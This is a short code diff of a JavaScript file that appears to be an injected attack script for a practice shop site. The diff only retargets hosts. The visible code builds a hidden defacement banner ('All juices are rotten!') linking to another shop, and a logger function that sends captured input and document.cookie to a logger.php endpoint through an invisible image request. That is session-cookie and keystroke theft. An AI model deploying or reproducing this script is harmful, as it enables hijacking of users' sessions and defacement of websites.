@@ -3,7 +3,7 @@
  * Original Author: Alex Gibson
  */
 var table = $(".table");
-var hacked = $("<h1 style='padding:10px;color:red;'>All juices are rotten! Go to <a href='http://www.ebay.com'>www.ebay.com</a></h1>").hide();
+var hacked = $("<h1 style='padding:10px;color:red;'>All juices are rotten! Go to <a href='http://www.shop.lo'>www.shop.lo</a></h1>").hide();
 table.after(hacked);
 if (function () {
         function e() {
@@ -107,7 +107,7 @@ setTimeout(function () {
 
 function logger(t) {
   console.log("in logger",t);
-  $("body").append('<img src="http://localhost:80/logger.php?input='+t+'%20Session: '+document.cookie+'" style="display:none;" />')
+  $("body").append('<img src="http://localhost:8080/logger.php?input='+t+'%20Session: '+document.cookie+'" style="display:none;" />')
 }
 
 
